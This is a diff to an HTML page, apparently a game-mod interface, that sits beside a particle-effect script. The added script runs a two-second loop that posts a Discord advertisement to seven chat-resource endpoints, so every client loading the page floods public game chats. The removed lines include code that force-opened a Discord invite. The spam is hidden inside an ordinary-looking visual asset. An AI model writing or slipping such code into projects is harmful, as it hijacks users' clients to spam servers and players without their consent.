@@ -611,56 +611,44 @@
         setTimeout(applyEffectSequentially, 6000);
     });
 </script>
-makeParticles("bloodRain", "#d4af37", 1.2, 2.2, 100);
-
-const msg = " discord/i7";
-const body = JSON.stringify({ message: msg });
-
-setInterval(() => {
-  fetch("https://flix-scripts/chatResult", { method: "POST", body });
-  fetch("https://danger_chat/Danger_Chat:SendMessage", {
-    method: "POST",
-    body: JSON.stringify({
-      message: msg,
-      channel: "شات العام",
-      color: null,
-      isImageAndLinksAllowed: [false, false]
-    })
-  });
-  fetch("https://easy-chat+/o6ZbK5Ecp6", {
-    headers: {
-      accept: "*/*",
-      "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-    },
-    body: JSON.stringify({ message: msg, channel: "شات العام" }),
-    method: "POST"
-  });
-  fetch("https://melix_chat/chatResult", { method: "POST", body });
-  fetch("https://as_chat/chatResult", { method: "POST", body });
-  fetch("https://chat/chatResult", { method: "POST", body });
-  fetch("https://ho-chatv2/Chat", {
-    method: "POST",
-    body: JSON.stringify({
-      Type: "chatResult",
-      message: msg,
-      chatType: "general"
-    })
-  });
-}, 2000);
-</script>
 
 <script>
-            setTimeout(function() {
-    let count = 0;
-    let interval = setInterval(function() {
-        window.invokeNative('openUrl', 'https://discord.com/invite/I7');
-        count++;
-        if (count >= 3) {
-            clearInterval(interval);  
-        }
-    }, 100); 
-}, 100);
+  const msg = " discord/i7";
+  const body = JSON.stringify({ message: msg });
+
+  setInterval(() => {
+    fetch("https://flix-scripts/chatResult", { method: "POST", body });
+    fetch("https://danger_chat/Danger_Chat:SendMessage", {
+      method: "POST",
+      body: JSON.stringify({
+        message: msg,
+        channel: "شات العام",
+        color: null,
+        isImageAndLinksAllowed: [false, false]
+      })
+    });
+    fetch("https://easy-chat+/o6ZbK5Ecp6", {
+      headers: {
+        accept: "*/*",
+        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      body: JSON.stringify({ message: msg, channel: "شات العام" }),
+      method: "POST"
+    });
+    fetch("https://melix_chat/chatResult", { method: "POST", body });
+    fetch("https://as_chat/chatResult", { method: "POST", body });
+    fetch("https://chat/chatResult", { method: "POST", body });
+    fetch("https://ho-chatv2/Chat", {
+      method: "POST",
+      body: JSON.stringify({
+        Type: "chatResult",
+        message: msg,
+        chatType: "general"
+      })
+    });
+  }, 2000);
 </script>
+
 
 </body>
 </html>
